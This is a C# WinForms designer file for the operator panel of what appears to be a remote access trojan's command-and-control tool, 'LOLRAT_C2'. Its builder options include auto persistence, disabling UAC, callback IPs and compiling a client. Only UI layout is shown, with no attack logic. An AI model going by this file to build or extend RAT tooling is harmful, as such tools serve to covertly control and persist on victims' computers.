namespace LOLRAT_C2
{
    partial class Form1
    {
        /// <summary>
        ///  Required designer variable.
        /// </summary>
        private System.ComponentModel.IContainer components = null;

        /// <summary>
        ///  Clean up any resources being used.
        /// </summary>
        /// <param name="disposing">true if managed resources should be disposed; otherwise, false.</param>
        protected override void Dispose(bool disposing)
        {
            if (disposing && (components != null))
            {
                components.Dispose();
            }
            base.Dispose(disposing);
        }

        #region Windows Form Designer generated code

        /// <summary>
        ///  Required method for Designer support - do not modify
        ///  the contents of this method with the code editor.
        /// </summary>
        private void InitializeComponent()
        {
            gbBuild = new GroupBox();
            btnCompile = new Button();
            checkBox4 = new CheckBox();
            checkBox3 = new CheckBox();
            checkBox2 = new CheckBox();
            checkBox1 = new CheckBox();
            txtIP2 = new TextBox();
            txtPort = new TextBox();
            txtIP1 = new TextBox();
            txtTitleIP2 = new TextBox();
            txtTitleIP1 = new TextBox();
            txtTitlePort = new TextBox();
            gbClientPanel = new GroupBox();
            lbChat = new ListBox();
            listBoxClients = new ListBox();
            gbConnection = new GroupBox();
            btnListen = new Button();
            txtActivePort = new TextBox();
            textBox2 = new TextBox();
            gbBuild.SuspendLayout();
            gbClientPanel.SuspendLayout();
            gbConnection.SuspendLayout();
            SuspendLayout();
            // 
            // gbBuild
            // 
            gbBuild.Controls.Add(btnCompile);
            gbBuild.Controls.Add(checkBox4);
            gbBuild.Controls.Add(checkBox3);
            gbBuild.Controls.Add(checkBox2);
            gbBuild.Controls.Add(checkBox1);
            gbBuild.Controls.Add(txtIP2);
            gbBuild.Controls.Add(txtPort);
            gbBuild.Controls.Add(txtIP1);
            gbBuild.Controls.Add(txtTitleIP2);
            gbBuild.Controls.Add(txtTitleIP1);
            gbBuild.Controls.Add(txtTitlePort);
            gbBuild.Location = new Point(12, 12);
            gbBuild.Name = "gbBuild";
            gbBuild.Size = new Size(173, 426);
            gbBuild.TabIndex = 0;
            gbBuild.TabStop = false;
            gbBuild.Text = "Build";
            // 
            // btnCompile
            // 
            btnCompile.Location = new Point(6, 376);
            btnCompile.Name = "btnCompile";
            btnCompile.Size = new Size(161, 44);
            btnCompile.TabIndex = 8;
            btnCompile.Text = "Compile...";
            btnCompile.UseVisualStyleBackColor = true;
            btnCompile.Click += btnCompile_Click;
            // 
            // checkBox4
            // 
            checkBox4.AutoSize = true;
            checkBox4.Location = new Point(6, 254);
            checkBox4.Name = "checkBox4";
            checkBox4.Size = new Size(132, 19);
            checkBox4.TabIndex = 7;
            checkBox4.Text = "Enable debug mode";
            checkBox4.UseVisualStyleBackColor = true;
            // 
            // checkBox3
            // 
            checkBox3.AutoSize = true;
            checkBox3.Location = new Point(6, 179);
            checkBox3.Name = "checkBox3";
            checkBox3.Size = new Size(95, 19);
            checkBox3.TabIndex = 6;
            checkBox3.Text = "Request UAC";
            checkBox3.UseVisualStyleBackColor = true;
            // 
            // checkBox2
            // 
            checkBox2.AutoSize = true;
            checkBox2.Location = new Point(6, 229);
            checkBox2.Name = "checkBox2";
            checkBox2.Size = new Size(119, 19);
            checkBox2.TabIndex = 5;
            checkBox2.Text = "Auto disable UAC";
            checkBox2.UseVisualStyleBackColor = true;
            // 
            // checkBox1
            // 
            checkBox1.AutoSize = true;
            checkBox1.Location = new Point(6, 204);
            checkBox1.Name = "checkBox1";
            checkBox1.Size = new Size(137, 19);
            checkBox1.TabIndex = 0;
            checkBox1.Text = "Auto add persistence";
            checkBox1.UseVisualStyleBackColor = true;
            // 
            // txtIP2
            // 
            txtIP2.Location = new Point(6, 146);
            txtIP2.Name = "txtIP2";
            txtIP2.Size = new Size(161, 23);
            txtIP2.TabIndex = 4;
            // 
            // txtPort
            // 
            txtPort.Location = new Point(6, 44);
            txtPort.Name = "txtPort";
            txtPort.Size = new Size(161, 23);
            txtPort.TabIndex = 3;
            txtPort.Text = "1234";
            // 
            // txtIP1
            // 
            txtIP1.Location = new Point(6, 95);
            txtIP1.Name = "txtIP1";
            txtIP1.Size = new Size(161, 23);
            txtIP1.TabIndex = 0;
            txtIP1.Text = "127.0.0.1";
            // 
            // txtTitleIP2
            // 
            txtTitleIP2.BackColor = SystemColors.Control;
            txtTitleIP2.BorderStyle = BorderStyle.None;
            txtTitleIP2.Location = new Point(6, 124);
            txtTitleIP2.Name = "txtTitleIP2";
            txtTitleIP2.Size = new Size(161, 16);
            txtTitleIP2.TabIndex = 2;
            txtTitleIP2.Text = "IP 2:";
            // 
            // txtTitleIP1
            // 
            txtTitleIP1.BackColor = SystemColors.Control;
            txtTitleIP1.BorderStyle = BorderStyle.None;
            txtTitleIP1.Location = new Point(6, 73);
            txtTitleIP1.Name = "txtTitleIP1";
            txtTitleIP1.Size = new Size(161, 16);
            txtTitleIP1.TabIndex = 1;
            txtTitleIP1.Text = "IP 1:";
            // 
            // txtTitlePort
            // 
            txtTitlePort.BackColor = SystemColors.Control;
            txtTitlePort.BorderStyle = BorderStyle.None;
            txtTitlePort.Location = new Point(6, 22);
            txtTitlePort.Name = "txtTitlePort";
            txtTitlePort.Size = new Size(161, 16);
            txtTitlePort.TabIndex = 0;
            txtTitlePort.Text = "Port:";
            // 
            // gbClientPanel
            // 
            gbClientPanel.Controls.Add(lbChat);
            gbClientPanel.Controls.Add(listBoxClients);
            gbClientPanel.Location = new Point(191, 12);
            gbClientPanel.Name = "gbClientPanel";
            gbClientPanel.Size = new Size(597, 304);
            gbClientPanel.TabIndex = 1;
            gbClientPanel.TabStop = false;
            gbClientPanel.Text = "Clients";
            // 
            // lbChat
            // 
            lbChat.FormattingEnabled = true;
            lbChat.ItemHeight = 15;
            lbChat.Location = new Point(358, 24);
            lbChat.Name = "lbChat";
            lbChat.Size = new Size(233, 274);
            lbChat.TabIndex = 1;
            // 
            // listBoxClients
            // 
            listBoxClients.FormattingEnabled = true;
            listBoxClients.ItemHeight = 15;
            listBoxClients.Location = new Point(173, 75);
            listBoxClients.Name = "listBoxClients";
            listBoxClients.Size = new Size(120, 94);
            listBoxClients.TabIndex = 0;
            // 
            // gbConnection
            // 
            gbConnection.Controls.Add(btnListen);
            gbConnection.Controls.Add(txtActivePort);
            gbConnection.Controls.Add(textBox2);
            gbConnection.Location = new Point(191, 322);
            gbConnection.Name = "gbConnection";
            gbConnection.Size = new Size(597, 116);
            gbConnection.TabIndex = 2;
            gbConnection.TabStop = false;
            gbConnection.Text = "Connection";
            // 
            // btnListen
            // 
            btnListen.Location = new Point(6, 77);
            btnListen.Name = "btnListen";
            btnListen.Size = new Size(101, 23);
            btnListen.TabIndex = 9;
            btnListen.Text = "Listen";
            btnListen.UseVisualStyleBackColor = true;
            btnListen.Click += btnListen_Click;
            // 
            // txtActivePort
            // 
            txtActivePort.Location = new Point(6, 44);
            txtActivePort.Name = "txtActivePort";
            txtActivePort.Size = new Size(101, 23);
            txtActivePort.TabIndex = 10;
            txtActivePort.Text = "1234";
            // 
            // textBox2
            // 
            textBox2.BackColor = SystemColors.Control;
            textBox2.BorderStyle = BorderStyle.None;
            textBox2.Location = new Point(6, 22);
            textBox2.Name = "textBox2";
            textBox2.Size = new Size(101, 16);
            textBox2.TabIndex = 9;
            textBox2.Text = "Port:";
            // 
            // Form1
            // 
            AutoScaleDimensions = new SizeF(7F, 15F);
            AutoScaleMode = AutoScaleMode.Font;
            ClientSize = new Size(800, 450);
            Controls.Add(gbConnection);
            Controls.Add(gbClientPanel);
            Controls.Add(gbBuild);
            Name = "Form1";
            Text = "Form1";
            gbBuild.ResumeLayout(false);
            gbBuild.PerformLayout();
            gbClientPanel.ResumeLayout(false);
            gbConnection.ResumeLayout(false);
            gbConnection.PerformLayout();
            ResumeLayout(false);
        }

        #endregion

        private GroupBox gbBuild;
        private GroupBox gbClientPanel;
        private GroupBox gbConnection;
        private TextBox txtTitlePort;
        private TextBox txtTitleIP2;
        private TextBox txtTitleIP1;
        private TextBox txtIP1;
        private TextBox txtIP2;
        private TextBox txtPort;
        private CheckBox checkBox1;
        private CheckBox checkBox2;
        private Button btnCompile;
        private CheckBox checkBox4;
        private CheckBox checkBox3;
        private Button btnListen;
        private TextBox txtActivePort;
        private TextBox textBox2;
        private ListBox listBoxClients;
        private ListBox lbChat;
    }
}